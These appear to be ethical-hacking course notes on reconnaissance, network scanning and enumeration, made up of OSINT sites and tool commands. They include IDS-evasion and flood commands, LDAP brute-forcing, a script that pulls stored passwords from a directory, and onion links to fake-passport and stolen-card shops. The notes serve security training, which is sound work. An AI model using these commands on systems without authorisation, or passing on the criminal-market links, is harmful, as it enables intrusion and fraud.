# Footprinting and Reconaissance
### Video Search Engine Info Gathering
To get information regarding Youtube Videos, refer to the site : https://mattw.io/youtube-metadata/

You can use other video search engines such as **Google videos** (https://www.google.com/videohp), **Yahoo videos** (https://in.video.search.yahoo.com), etc.; video analysis tools such as **EZGif** (https://ezgif.com), **VideoReverser.com** (https://www.videoreverser.com) etc.; and reverse image search tools such as **TinEye Reverse Image Search** (https://tineye.com), **Yahoo Image Search** (https://images.search.yahoo.com), etc. to gather crucial information about the target organization.


### Gather Information from FTP Search Engines
www.searchftps.net/ & https://www.freewareweb.com are websites to gather FTP Info about target organization.

### Gather Information from IoT Search Engines
Website that can be used : http://www.shodan.io/
**Censys** (https://censys.io), which is an IoT search engine, to gather information such as manufacturer details, geographical location, IP address, hostname, open ports, etc.

### Perform Footprinting Through Web Services
### Finding Company's Domains and Sub-Domains using Netcraft
https://www.sitereport.netcraft.com is the website to perform foot-printing on.
To get information about the subdomains of the website we can visit the website : https://www.searchdns.netcraft.com/?host=*.eccouncil.org
**Sublist3r** (https://github.com), **Pentest-Tools Find Subdomains** (https://pentest-tools.com)

### Gathering Personal Information using PeekYou Onlince People Search Service 
https://www.peekyou.com
Spokeo (https://www.spokeo.com), **pipl** (https://pipl.com), **Intelius** (https://www.intelius.com), **BeenVerified** (https://www.beenverified.com), etc., people search services to gather personal information of key employees in the target organization

### Gather an Email List using theHarvester
The command used to run theHarvester : `theHarvester -d microsoft.com -l 200 -b baidu`

### Gather Information using Deep and Dark Web Searching

- **The Hidden Wiki** is an onion site that works as a Wikipedia service of hidden websites. (http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion/wiki)
    
- **FakeID** is an onion site for creating fake passports (http://ymvhtqya23wqpez63gyc3ke4svju3mqsby2awnhd3bk2e65izt7baqad.onion)
    
- **Cardshop** is an onion site that sells cards with good balances (http://s57divisqlcjtsyutxjz2ww77vlbwpxgodtijcsrgsuts4js5hnxkhqd.onion)

**ExoneraTor** (https://metrics.torproject.org), **OnionLand Search engine** (https://onionlandsearchengine.com), etc. to perform deep and dark web browsing.

### Determine Target OS Through Passive Footprinting
https://search.censys.io/?q=
**Netcraft** (https://www.netcraft.com), **Shodan** (https://www.shodan.io), etc. to gather OS information of target organization through passive footprinting.


### Perform Footprinting Through Social Networking Sites

##### Gather Employee's Information from LinkedIn using theHarvester
`theHarvester -d eccouncil -l 200 -b linkedin` is the command to search Employee's information from LinkedIn using theHarvester

##### Gather Personal Information from Various Social Networking Sites using Sherlock
Command used to do so: `sherlock "satya nadella"`
**Social Searcher** (https://www.social-searcher.com), **UserRecon** (https://github.com), etc. to gather additional information related to the target company and its employees from social networking sites.

### Perform Website Footprinting
##### Gather Information About a Target Website using Ping Command Line Utility
`ping website.com` is a utility that helps us to show information regarding a website like its IP Address
Flags that can be used with `ping`  :
- `-f`  : Specifies setting not fragmenting flag in packet ( **Packet needs to be fragmented but DF set**, means that the frame is too large to be on the network and needs to be fragmented. The packet was not sent as we used the **-f** switch with the ping command, and the ping command returned this error)
- `-l`  : Specifies buffer size
- `-i` : Specifies the Time to Live (TTL)
- `-n` : Specifies the number of echo requests to be sent to the target

##### Gather Information about a Target Website using Photon
Photon is a Python script used to crawl a given target URL to obtain information such as URLs (in-scope and out-of-scope), URLs with parameters, email addresses, social media accounts, files, secret keys and subdomains. The extracted information can further be exported in the JSON format.

 `python3 photon.py -u http://www.certifiedhacker.com` is the command used to run Photon.
`python3 photon.py -u http://www.certifiedhacker.com -l 3 -t 200 --wayback` 

Flags used with Photon :
- `u` : specifies the target website (here, www.certifiedhacker.com)
- `-l` : specifies level to crawl (here, 3)
- `-t` : specifies number of threads (here, 200)
- `--wayback` : specifies using URLs from archive.org as seeds

##### Gather Information About a Target Website Using Central Ops
https://centralops.net is the website to be used.
**Website Informer** (https://website.informer.com), **Burp Suite** (https://portswigger.net), **Zaproxy** (https://www.zaproxy.org), etc. to perform website footprinting on a target website.

##### Extract a Company's Data using Web Data Extractor
Web data extraction is the process of extracting data from web pages available on the company’s website. A company’s data such as contact details (email, phone, and fax), URLs, meta tags (title, description, keyword) for website promotion, directories, web research, etc. are important sources of information for an ethical hacker. Web spiders (also known as a web crawler or web robot) such as Web Data Extractor perform automated searches on the target website and extract specified information from the target website.

Web Data Extractor is a Windows Tool.
**ParseHub** (https://www.parsehub.com), **SpiderFoot** (https://www.spiderfoot.net), etc. to extract the target organization’s data.

##### Mirror a Target Website using HTTrack Web Site Copier
Website mirroring is the process of creating a replica or clone of the original website; this mirroring of the website helps you to footprint the web site thoroughly on your local system, and allows you to download a website to a local directory, analyze all directories, HTML, images, flash, videos, and other files from the server on your computer.

You can duplicate websites by using website mirroring tools such as HTTrack Web Site Copier. HTTrack is an offline browser utility that downloads a website from the Internet to a local directory, builds all directories recursively, and transfers HTML, images, and other files from the webserver to another computer.

Here, we will use the HTTrack Web Site Copier tool to mirror the entire website of the target organization, store it in the local system drive, and browse the local website to identify possible exploits and vulnerabilities.

**Cyotek WebCopy** (https://www.cyotek.com), etc. to mirror a target website.

##### Gather Information About a Target Website using GRecon
`python3 grecon.py` is the command to run GRecon on Linux.
  
**GRecon** searches for available subdomains, sub-subdomains, login pages, directory listings, exposed documents, WordPress entries and pasting sites and displays the results.

##### Gather a Wordlist from the Target Website using CeWL
`cewl -d 2 -m 5 https://www.certifiedhacker.com` It gathers a unique wordlist from the website.
`cewl -w wordlist.txt -d 2 -m 5 https://www.certifiedhacker.com` is used to write all the results into a text file.


### Email Footprinting
E-mail footprinting, or tracking, is a method to monitor or spy on email delivered to the intended recipient. This kind of tracking is possible through digitally time-stamped records that reveal the time and date when the target receives and opens a specific email.

##### Gather Information about a Target by Tracing Emails using eMailTrackerPro

**Infoga** (https://github.com), **Mailtrack** (https://mailtrack.io), etc. to track an email and extract target information such as sender identity, mail server, sender’s IP address, location, etc.

### Perform Whois Footprinting DomainTools
**SmartWhois** (https://www.tamos.com), **Batch IP Converter** (http://www.sabsoft.com), etc. to extract additional target Whois information.

### Perform DNS Footprinting
##### Gather DNS Information using nslookup Command Line Utility and Online Tool
nslookup is a network administration command-line utility, generally used for querying the DNS to obtain a domain name or IP address mapping or for any other specific DNS record. This utility is available both as a command-line utility and web application.

![[Pasted image 20241120142854.png]]

**DNSdumpster** (https://dnsdumpster.com), **DNS Records** (https://network-tools.com), etc. to extract additional target DNS information.

##### Perform Reverse DNS Lookup using Reverse IP Domain Check and DNSRecon

 https://www.yougetsignal.com is the website to be used for Reverse IP Domain Check.

`./dnsrecon.py -r 162.241.216.0-162.241.216.255` command that can be sued on Linux System for DNSRecon

https://securitytrails.com/ is a website to gather information regarding the subdomain and DNS Records of Target Website.


### Network Footprinting

##### Locate the Network Range
Network range information assists in creating a map of the target network. Using the network range, you can gather information about how the network is structured and which machines in the networks are alive.

We can locate network range using the ARIN Whois Database Search Tool.
https://www.arin.net/about/welcome/region is a website for the same.

##### Perform Network Tracerouting in Windows and Linux Machines
`tracert www.certifiedhacker.com` is the command used for Tracerouting using Windows machine. And to know more about the tool use the command : `tracert /?`

`traceroute www.certifiedhacker.com` is the command used for Tracerouting using Linux Machine.

**VisualRoute** (http://www.visualroute.com), **Traceroute NG** (https://www.solarwinds.com), etc. to extract additional network information of the target organization.

##### Performing Foot-printing using Various Foot-printing Tools
##### Foot-printing a Target using Recon-ng
Recon-ng is a web reconnaissance framework with independent modules and database interaction that provides an environment in which open-source web-based reconnaissance can be conducted.

To use the tool Recon-ng in Linux, we need to type in the command : `recon-ng`
We need to install and update all the modules available in the tool using the command : `marketplace install all`

And to search a particular module, we need type in the command : `modules search`

To create a workspace, we need to type in the command : `workspaces create <name>`

To know about all the available workspaces we can type in the command : `workspaces list`

Now, to add domains, we can use the command : `db insert domains`

To know more about the domains, we can use the command : `show domains`

To find a module with a name we can use the command : `modules load brute`

To load a particular module, use the command : `modules load recon/domains-hosts/brute_hosts`

**Creating a Report**
1. Type the **modules load reporting/html** command and press **Enter**.
2. Observe that you need to assign values for **CREATOR** and **CUSTOMER** options while the **FILENAME** value is already set, and you may change the value if required.
3. Type:
    - `options set FILENAME /home/attacker/Desktop/results.html` and press **Enter**. By issuing this command, you are setting the report name as **results.html** and the path to store the file as **Desktop**.
    - `options set CREATOR [your name]` (here, **Jason**) and press **Enter**.
    - `options set CUSTOMER Certifiedhacker Networks` (since you have performed network reconnaissance on **certifiedhacker.com** domain) and press **Enter**.

##### Gathering Personal Information

Type `modules load recon/domains-contacts/whois_pocs` and press **Enter**. This module uses the ARIN Whois RWS to harvest POC data from Whois queries for the given domain.
Type the **info** **command** and press **Enter** to view the options required to run this module.
Type **options set SOURCE facebook.com** and press **Enter** to add facebook.com as a target domain.


##### Gathering List of Subdomains and IP Addresses
To extract a list of subdomains and IP addresses associated with the target URL, we need to load the `recon/domains-hosts/hackertarget` module.
Type the `modules load recon/domains-hosts/hackertarget` command and press **Enter**.
Type the `options set SOURCE certifiedhacker.com` command and press **Enter**.

##### Footprinting a Target using OSRFramework

Use **domainfy** to check with the existing domains using words and nicknames. Type `domainfy -n [Domain Name] -t all`

Use **searchfy** to check for the existence of a given user details on different social networking platforms such as Github, Instagram and Keyserverubuntu. Type `searchfy -q "target user name or profile name"`

- **usufy** - Gathers registered accounts with given usernames.
- **mailfy** – Gathers information about email accounts
- **phonefy** – Checks for the existence of a given series of phones
- **entify** – Extracts entities using regular expressions from provided URLs

##### Footprinting a Target using FOCA (Fingerprinting Organizations with Collected Archives)
FOCA (Fingerprinting Organizations with Collected Archives) is a tool that reveals metadata and hidden information in scanned documents. These documents are searched for using three search engines: Google, Bing, and DuckDuckGo. The results from the three engines amounts to a lot of documents. FOCA examines a wide variety of records, with the most widely recognized being Microsoft Office, Open Office and PDF documents. It may also work with Adobe InDesign or SVG files. These archives may be on-site pages and can be downloaded and dissected with FOCA.

FOCA is a Windows tool for Footprinting using famous SEOs available.

##### Footprinting a Target using BillCipher
BillCipher is an information gathering tool for a Website or IP address. Using this tool, you can gather information such as DNS Lookup, Whois lookup, GeoIP Lookup, Subnet Lookup, Port Scanner, Page Links, Zone Transfer, HTTP Header, etc.

##### Footprinting a Target using OSINT Framework
OSINT Framework is an open source intelligence gathering framework that helps security professionals for performing automated footprinting and reconnaissance, OSINT research, and intelligence gathering. It is focused on gathering information from free tools or resources. This framework includes a simple web interface that lists various OSINT tools arranged by category and is shown as an OSINT tree structure on the web interface.

The website where all the resources are listed : https://osintframework.com/



# Scanning Networks

### Perform Host Discovery

##### Perform Host Discovery using Nmap
Nmap is a utility used for network discovery, network administration, and security auditing. It is also used to perform tasks such as network inventory, managing service upgrade schedules, and monitoring host or service uptime.

`nmap -sn -PR <ip_address>` - command used to perform ARP Ping Scan
`nmap -sn -PU <ip_address>` - command used to perform UDP Ping Scan


Flags : 
- `-sn` : Disables Port Scan
- `-PR` : Performs ARP Ping Scan
- `-PU` : Performs UDP Ping Scan
- `-PE` : Performs ICMP ECHO Ping Scan

Scans:
- **ICMP Address Mask Ping Scan**: This technique is an alternative for the traditional ICMP ECHO ping scan, which are used to determine whether the target host is live specifically when administrators block the ICMP ECHO pings. `nmap -sn -PM [target IP address]` is the command
- **TCP SYN Ping Scan**: This technique sends empty TCP SYN packets to the target host, ACK response means that the host is active.`nmap -sn -PS [target IP address]` is the command
- **TCP ACK Ping Scan**: This technique sends empty TCP ACK packets to the target host; an RST response means that the host is active. `nmap -sn -PA [target IP address]` is the command.
- **IP Protocol Ping Scan**: This technique sends different probe packets of different IP protocols to the target host, any response from any probe indicates that a host is active. `nmap -sn -PO [target IP address]` is the command.

##### Perform Host Discovery using Angry IP Scanner
IP Scanner is a Windows tool used to scan all the Alive IPs present on the Network.
**SolarWinds Engineer’s Toolset** (https://www.solarwinds.com), **NetScanTools Pro** (https://www.netscantools.com), **Colasoft Ping Tool** (https://www.colasoft.com), **Visual Ping Tester** (http://www.pingtester.net), and **OpUtils** (https://www.manageengine.com) to discover active hosts in the target network.

### Perform Port and Service Discovery
Port scanning techniques are categorized according to the type of protocol used for communication within the network.
- TCP Scanning
    - Open TCP scanning methods (TCP connect/full open scan)
    - Stealth TCP scanning methods (Half-open Scan, Inverse TCP Flag Scan, ACK flag probe scan, third party and spoofed TCP scanning methods)
- UDP Scanning
- SCTP Scanning
    - SCTP INIT Scanning
    - SCTP COOKIE/ECHO Scanning
- SSDP and List Scanning
- IPv6 Scanning

##### Perform Port and Service Discovery using MegaPing
MegaPing is a toolkit that provides essential utilities for Information System specialists, system administrators, IT solution providers, and individuals. It is used to detect live hosts and open ports of the system in the network, and can scan your entire network and provide information such as open shared resources, open ports, services/drivers active on the computer, key registry entries, users and groups, trusted domains, printers, etc. You can also perform various network troubleshooting activities with the help of integrated network utilities such as DNS lookup name, DNS list hosts, Finger, host monitor, IP scanner, NetBIOS scanner, ping, port scanner, share scanner, traceroute, and Whois.
 It is similar to Angry IP Scanner.
##### Perform Port and Service Discovery using NetScanToolsPro
NetScanTools Pro is an integrated collection of utilities that gathers information on the Internet and troubleshoots networks for Network Professionals. With the available tools, you can research IPv4/IPv6 addresses, hostnames, domain names, e-mail addresses, and URLs on the target network.

##### Perform Port Scanning using sx Tool
`sx arp [Target subnet]` is the command used to perform port scanning using sx tool in Linux.
![[Pasted image 20241121230151.png]]

Type `sx arp [Target subnet] --json | tee arp.cache` and press **Enter** to create arp.cache file (here, the target subnet is **10.10.1.0/24**).

![[Pasted image 20241121230238.png]]

Type `cat arp.cache | sx tcp -p 1-65535 [Target IP address]` and press **Enter** to list all the open tcp ports on the target machine (here, the target IP address is **10.10.1.11**).

> **tcp**: performs a TCP scan, **-p**: specifies the range of ports to be scanned (here, the range is **1-65535**).

![[Pasted image 20241121230425.png]]
In the terminal, type **cat arp.cache | sx udp --json -p [Target Port] 10.10.1.11** and press **Enter** (here, the target port is **53**). `udp`: performs a UDP scan, `-p` specifies the target port. In a UDP scan `sx` returns the IP address, ICMP packet type and code set to the reply packet.

##### Explore Various Network Scanning Techniques using Nmap
Zenmap is the GUI Tool in Windows which replicates the OG Nmap tool in Linux.


##### Explore Various Network Scanning Techniques using Hping3
Hping2/Hping3 is a command-line-oriented network scanning and packet crafting tool for the TCP/IP protocol that sends ICMP echo requests and supports TCP, UDP, ICMP, and raw-IP protocols. Using Hping, you can study the behavior of an idle host and gain information about the target such as the services that the host offers, the ports supporting the services, and the OS of the target.

 `hping3 -A [Target IP Address] -p 80 -c 5` is the command to use Hping.
 In this command, -A specifies setting the ACK flag, -p specifies the port to be scanned (here, 80), and -c specifies the packet count (here, 5).
In a result, the number of packets sent and received is equal, indicating that the respective port is open, as shown in the screenshot.

The ACK scan sends an ACK probe packet to the target host; no response means that the port is filtered. If an RST response returns, this means that the port is closed.

In the terminal window, type `hping3 -8 0-100 -S [Target IP Address] -V` (here, the target machine is Windows Server 2022 [10.10.1.22]) and press Enter.
In this command, -8 specifies a scan mode, -p specifies the range of ports to be scanned (here, 0-100), and -V specifies the verbose mode.
The result appears, displaying the open ports along with the name of service running on each open port, as shown in the screenshot.
The SYN scan principally deals with three of the flags: SYN, ACK, and RST. You can use these three flags for gathering illegal information from servers during the enumeration process.


In the terminal window, type `hping3 -F -P -U [Target IP Address] -p 80 -c 5` (here, the target machine is Windows Server 2022 [10.10.1.22]) and press Enter.
In this command, `-F` specifies setting the FIN flag, `-P` specifies setting the PUSH flag, `-U` specifies setting the URG flag, `-c` specifies the packet count (here, 5), and `-p` specifies the port to be scanned (here, 80).

In the terminal window, type `hping3 --scan 0-100 -S [Target IP Address]` (here, the target machine is Windows Server 2022 [10.10.1.22]) and press Enter.
In this command, `--scan` specifies the port range to scan, `0-100` specifies the range of ports to be scanned, and `-S` specifies setting the SYN flag.
The result appears displaying the open ports and names of the services running on the target IP address, as shown in the screenshot.
In the TCP stealth scan, the TCP packets are sent to the target host; if a SYN+ACK response is received, it indicates that the ports are open.

In the terminal window, type `hping3 -1 [Target IP Address] -p 80 -c 5` to perform ICMP scan (here, the target machine is Windows Server 2022 [10.10.1.22]) and press Enter
In this command, `-1` specifies ICMP ping scan, `-c` specifies the packet count (here, 5), and `-p` specifies the port to be scanned (here, 80).
The results demonstrate that hping has sent ICMP echo requests to 10.10.1.22 and received ICMP replies which determines that the host is up.

Entire subnet scan for live host: `hping3 -1 [Target Subnet] --rand-dest -I eth0`
UDP scan: `hping3 -2 [Target IP Address] -p 80 -c 5`

### Perform OS Discovery
##### Identify the Target System's OS with Time-to-Live(TTL) and TCP Window Sizes using Wireshark
Wireshark gives us a GUI Facility in Windows to use it for OS Discovery.

##### Perform OS Discovery using Nmap Script Engine (NSE)
`nmap -A [Target IP Address]` is the command used for OS Discovery in Linux.

In the terminal window, type the command `nmap --script smb-os-discovery.nse [Target IP Address]` (here, the target machine is Windows Server 2022 [10.10.1.22]) and press Enter.

`--script`: specifies the customized script and `smb-os-discovery.nse`: attempts to determine the OS, computer name, domain, workgroup, and current time over the SMB protocol (ports 445 or 139).

##### Perform OS Discovery using Unicornscan
Unicornscan is a Linux-based command line-oriented network information-gathering and reconnaissance tool. It is an asynchronous TCP and UDP port scanner and banner grabber that enables you to discover open ports, services, TTL values, etc. running on the target machine. In Unicornscan, the OS of the target machine can be identified by observing the TTL values in the acquired scan result.

`unicornscan [Target IP Address] -Iv` is the command to use unicornscan. In this command, `-I` specifies an immediate mode and `v` specifies a verbose mode.


### Scan Beyond IDS and Firewall
An Intrusion Detection System (IDS) and firewall are the security mechanisms intended to prevent an unauthorized person from accessing a network. However, even IDSs and firewalls have some security limitations. Firewalls and IDSs intend to avoid malicious traffic (packets) from entering into a network, but certain techniques can be used to send intended packets to the target and evade IDSs/firewalls.

Techniques to evade IDS/firewall:

- **Packet Fragmentation**: Send fragmented probe packets to the intended target, which re-assembles it after receiving all the fragments
- **Source Routing**: Specifies the routing path for the malformed packet to reach the intended target
- **Source Port Manipulation**: Manipulate the actual source port with the common source port to evade IDS/firewall
- **IP Address Decoy**: Generate or manually specify IP addresses of the decoys so that the IDS/firewall cannot determine the actual IP address
- **IP Address Spoofing**: Change source IP addresses so that the attack appears to be coming in as someone else
- **Creating Custom Packets**: Send custom packets to scan the intended target beyond the firewalls
- **Randomizing Host Order**: Scan the number of hosts in the target network in a random order to scan the intended target that is lying beyond the firewall
- **Sending Bad Checksums**: Send the packets with bad or bogus TCP/UPD checksums to the intended target
- **Proxy Servers**: Use a chain of proxy servers to hide the actual source of a scan and evade certain IDS/firewall restrictions
- **Anonymizers**: Use anonymizers that allow them to bypass Internet censors and evade certain IDS and firewall rules

##### Create Custom UDP & TCP Packets using Hping3 to Scan beyond IDS/Firewall
`hping3 [Target IP Address] --udp --rand-source --data 500` (here, the target machine is Windows 11 [10.10.1.11]) and press Enter.
Here, --udp specifies sending the UDP packets to the target host, --rand-source enables the random source mode and --data specifies the packet body size.

`hping3 -S [Target IP Address] -p 80 -c 5` (here, target IP address is 10.10.1.11), and then press Enter.
Here, -S specifies the TCP SYN request on the target machine, -p specifies assigning the port to send the traffic, and -c is the count of the packets sent to the target machine.

`hping3 [Target IP Address] --flood `(here, target IP address is 10.10.1.11) and press Enter.`--flood`: performs the TCP flooding.


**NetScanTools Pro** (https://www.netscantools.com), **Colasoft packet builder** (https://www.colasoft.com), etc. to build custom packets to evade security mechanisms.

### Perform Network Scanning Using Scanning Tools
##### Scan a Target using Metasploit
`service postgresql start` to start the Postgresql Service on Linux.
Then type `msfconsole` to launch Metasploit.

If the error message says that `[*] postgresql selected, no connection` then do the run the command on the CLI as `msfdb init` and then `service postgresql restart`

And now on checking the `db_status` it would connect to the Database.

`nmap -Pn -sS -A -oX Test 10.10.1.0/24` : To scan the subnet
Then we could directly import these Hosts to the Msfconsole.
And on typing `hosts` we get the list of active hosts along with their MAC Addresses. To know about the services running on these active hosts, enter the command `services` or `db_services`.
Then to scan the ports, we need to search a module for that using the command : `search portscan`
We will be using this exact module `use auxiliary/scanner/portscan/syn`
And we need to set the options to following Host using the commands given as :
- `set INTERFACE eth0
- `set PORTS 80`
- `set RHOSTS 10.10.1.5-23`
- `set THREADS 50`
Then we will perform TCP Scan using the module, `use auxiliary/scanner/portscan/tcp`. And then typing the command `hosts -R` to automatically set this option with the discovered hosts present in our databases.

Then we will be using the module : `use auxiliary/scanner/smb/smb_version`
- `set RHOSTS 10.10.1.5-23'
- `set THREADS 11`

# Enumeration
### Perform NetBIOS Enumeration
##### Perform NetBIOS Enumeration using Window Command-Line Utilities
NetBIOS enumeration allows you to collect information about the target such as a list of computers that belong to a target domain, shares on individual hosts in the target network, policies, passwords, etc. This data can be used to probe the machines further for detailed information about the network and host resources.

NetBIOS stands for Network Basic Input Output System. Windows uses NetBIOS for file and printer sharing. A NetBIOS name is a unique computer name assigned to Windows systems, comprising a 16-character ASCII string that identifies the network device over TCP/IP. The first 15 characters are used for the device name, and the 16th is reserved for the service or name record type.

The NetBIOS service is easily targeted, as it is simple to exploit and runs on Windows systems even when not in use. NetBIOS enumeration allows attackers to read or write to a remote computer system (depending on the availability of shares) or launch a denial of service (DoS) attack.

`nbtstat -a [IP address of the remote machine]` is the command to run NBTStat which displays NetBIOS name table of a computer / system.

`nbtstat -c` : In this command, -c lists the contents of the NetBIOS name cache of the remote computer.

`net use` :  displays information about the target such as connection status, shared folder/drive and network information

##### Perform NetBIOS Enumeration using NetBIOS Enumerator
NetBIOS Enumerator is a tool that enables the use of remote network support and several other techniques such as SMB (Server Message Block). It is used to enumerate details such as NetBIOS names, usernames, domain names, and MAC addresses for a given range of IP addresses.

Just enter the range in the software you want to scan.

##### Perform NetBIOS Enumeration using an NSE Script
`nmap -sV -v --script nbstat.nse [Target IP Address]` : {`-sV` detects the service versions, `-v` enables the verbose output (that is, includes all hosts and ports in the output), and `--script` nbstat.nse performs the NetBIOS enumeration} It displays the open ports and services, along with their versions. Displayed under the **Host script results** section are details about the target system such as the NetBIOS name, NetBIOS user, and NetBIOS MAC address

`nmap -sU -p 137 --script nbstat.nse 10.10.1.22` : {> **-sU** performs a UDP scan, **-p** specifies the port to be scanned, and **--script nbstat.nse** performs the NetBIOS enumeration} It displays the open NetBIOS port (137) and, under the **Host script results** section, NetBIOS details such as NetBIOS name, NetBIOS user, and NetBIOS MAC of the target system.

**Global Network Inventory** (http://www.magnetosoft.com), **Advanced IP** **Scanner** (https://www.advanced-ip-scanner.com), **Hyena** (https://www.systemtools.com), and **Nsauditor Network Security Auditor** (https://www.nsauditor.com).

### Perform SNMP Enumeration
SNMP stands for Simple Network Management Protocol.

##### Perform SNMP Enumeration using snmp-check (Linux)
snmp-check is a tool that enumerates SNMP devices, displaying the output in a simple and reader-friendly format. The default community used is “public.” As an ethical hacker or penetration tester, it is imperative that you find the default community strings for the target device and patch them up.

 `nmap -sU -p 161 [Target IP address]` is the command used to check for SNMP Port. `-sU` performs a UDP scan and `-p` specifies the port to be scanned.
The results appear, displaying that port 161 is open and being used by SNMP.

`snmp-check [Target IP Address]` is the command to use SNMP-Check.
![[Pasted image 20241126022412.png]]

##### Perform SNMP Enumeration using SoftPerfect Network Scanner (Windows Tool)
SoftPerfect Network Scanner can ping computers, scan ports, discover shared folders, and retrieve practically any information about network devices via WMI (Windows Management Instrumentation), SNMP, HTTP, SSH, and PowerShell.

The program also scans for remote services, registries, files, and performance counters. It can check for a user-defined port and report if one is open, and is able to resolve hostnames as well as auto-detect your local and external IP range. SoftPerfect Network Scanner offers flexible filtering and display options, and can export the NetScan results to a variety of formats, from XML to JSON. In addition, it supports remote shutdown and Wake-On-LAN.

- Click on the **Options** menu, and select **Remote SNMP…** from the drop down list. The **SNMP** pop-up window will appear.
	![[Pasted image 20241126022638.png]]

**Network Performance Monitor** (https://www.solarwinds.com), **OpUtils** (https://www.manageengine.com), **PRTG Network Monitor** (https://www.paessler.com), and **Engineer’s Toolset** (https://www.solarwinds.com) to perform SNMP enumeration on the target network.


##### Perform SNMP Enumeration using SnmpWalk
SnmpWalk is a command line tool that scans numerous SNMP nodes instantly and identifies a set of variables that are available for accessing the target network. It is issued to the root node so that the information from all the sub nodes such as routers and switches can be fetched.

`snmpwalk -v1 -c public [target IP]` is the command to be used. `–v` : specifies the SNMP version number (1 or 2c or 3) and `–c` : sets a community string.

`snmpwalk -v2c -c public [Target IP Address]` is the command meaning `–v`: specifies the SNMP version (here, 2c is selected) and `–c`: sets a community string.

##### Perform SNMP Enumeration using NMAP
`nmap -sU -p 161 --script=snmp-sysdescr [target IP Address]` is the command to be used for the same. **-sU**: specifies a UDP scan, `-p`: specifies the port to be scanned, and `–-script`: is an argument used to execute a given script (here, snmp-sysdescr)

`nmap -sU -p 161 --script=snmp-processes [target IP Address]` shows the processes running on the system.

`nmap -sU -p 161 --script=snmp-win32-software [target IP Address]` is the command that outputs the number of software running on the system.

`nmap -sU -p 161 --script=snmp-interfaces [target IP Address]` is the command that displays the interfaces present.

### Perform LDAP (Lightweight Directory Access Protocol) Enumeration
Lightweight Directory Access Protocol (LDAP) is an open, industry standard protocol that allows users to access, search, and modify directory information over a network. It's used to store, manage, and secure information about users, devices, and organizations, such as usernames and passwords.

##### Perform LDAP Enumeration using Active Directory Explorer (AD Explorer)
Active Directory Explorer (AD Explorer) is an advanced Active Directory (AD) viewer and editor. It can be used to navigate an AD database easily, define favorite locations, view object properties and attributes without having to open dialog boxes, edit permissions, view an object’s schema, and execute sophisticated searches that can be saved and re-executed.

**Softerra LDAP Administrator** (https://www.ldapadministrator.com), **LDAP Admin Tool** (https://www.ldapsoft.com), **LDAP Account Manager** (https://www.ldap-account-manager.org), and **LDAP Search** (https://securityxploded.com) to perform LDAP enumeration on the target

##### Perform LDAP Enumeration using Python and Nmap

`nmap -sU -p 389 [Target IP address]` is the command used to know about the LDAP port being open or not. `-sU`: performs a UDP scan and `-p`: specifies the port to be scanned.

`nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=CEH,dc=com"' [Target IP Address]` and this commands means : `-p`: specifies the port to be scanned, `ldap-brute`: to perform brute-force LDAP authentication. `ldap.base`: if set, the script will use it as a base for the password guessing attempts. Nmap attempts to brute-force LDAP authentication and displays the usernames that are found.


Create a Python File with the code to get all the information : 
```
import ldap3
server=ldap3.Server(’[Target IP Address]’, get_info=ldap3.ALL,port=[Target Port])
connection=ldap3.Connection(server)
connection.bind()
print("Server Information")
server.info
connection.search(search_base='DC=CEH,DC=com', search_filter='(&(objectclass=*))', search_scope='SUBTREE', attributes='*')
print("Connection Entries with all Attributes")
connection.entries
connection.search(search_base='DC=CEH,DC=com', search_filter='(&(objectclass=person))', search_scope='SUBTREE', attributes='userpassword')
print("Connection Entries with Username and Password")
connection.entries()
```

##### Perform LDAP Enumeration using ldapsearch
`ldapsearch -h [Target IP Address] -x -s base namingcontexts` : to gather details related to the naming contexts.
`-x`: specifies simple authentication, `-h`: specifies the host, and `-s`: specifies the scope.

 `ldapsearch -h [Target IP Address] -x -b “DC=CEH,DC=com”` : to obtain more information about the primary domain.
`-x`: specifies simple authentication, `-h`: specifies the host, and `-b`: specifies the base DN for search.

`ldapsearch -x -h [Target IP Address] -b "DC=CEH,DC=com" "objectclass=*"` : to retrieve information related to all the objects in the directory tree. `-x`: specifies simple authentication, `-h`: specifies the host, and `-b`: specifies the base DN for search.

### Perform NFS Enumeration
The next step after LDAP enumeration is to perform NFS enumeration to identify exported directories and extract a list of clients connected to the server, along with their IP addresses and shared data associated with them.

##### Perform NFS Enumeration using RPCScan and SuperEnum
NFS enumeration is the process of identifying Network File System (NFS) shares on a computer.

To check for the port being open for NFS in the system, type the command : `nmap -p 2049 [IP_Address]`

To use SuperEnum, we need to put the IP Address in a text file using the command : `echo "10.10.1.19" >> Target.txt `
![[Pasted image 20241126203739.png]]

To use RPCScan, we need to use the command : ` python3 rpc-scan.py [Target IP address] --rpc`

### Perform DNS Enumeration
The next step after NFS enumeration is to perform DNS enumeration. This process yields information such as DNS server names, hostnames, machine names, usernames, IP addresses, and aliases assigned within a target domain.

DNS enumeration techniques are used to obtain information about the DNS servers and network infrastructure of the target organization. DNS enumeration can be performed using the following techniques:

- Zone transfer
- DNS cache snooping
- DNSSEC zone walking

##### Perform DNS Enumeration using Zone Transfer
DNS zone transfer is the process of transferring a copy of the DNS zone file from the primary DNS server to a secondary DNS server. In most cases, the DNS server maintains a spare or secondary server for redundancy, which holds all information stored in the main server.

If the DNS transfer setting is enabled on the target DNS server, it will give DNS information; if not, it will return an error saying it has failed or refuses the zone transfer.

 We will perform DNS enumeration through zone transfer by using the dig (Linux-based systems) and nslookup (Windows-based systems) utilities.


`dig ns [Target Domain]` : Command used to return name servers in the result
![[Pasted image 20241126204632.png]]

`dig @[[NameServer]] [[Target Domain]] axfr` : Command used to return the Zone Transfer Information of Name Server.

*After retrieving DNS name server information, the attacker can use one of the servers to test whether the target DNS allows zone transfers or not. In this case, zone transfers are not allowed for the target domain; this is why the command resulted in the message: Transfer failed. A penetration tester should attempt DNS zone transfers on different domains of the target organization.*

**nslookup on Windows**
In the nslookup interactive mode, type `set querytype=soa`.
*set **querytype=soa** sets the query type to SOA (Start of Authority) record to retrieve administrative information about the DNS zone of the target domain.*
![[Pasted image 20241126205053.png]]

In the nslookup interactive mode, type `ls -d [Name Server]` : requests a zone transfer of the specified name server.

##### Perform DNS Enumeration using DNSSEC Zone Walking
`./dnsrecon.py -d [Target domain]` : In this command, -d specifies the target domain and -z specifies that the DNSSEC zone walk be performed with standard enumeration.
![[Pasted image 20241126205456.png]]
Using the DNSRecon tool, the attacker can enumerate general DNS records for a given domain (MX, SOA, NS, A, AAAA, SPF, and TXT). These DNS records contain digital signatures based on public-key cryptography to strengthen authentication in DNS.

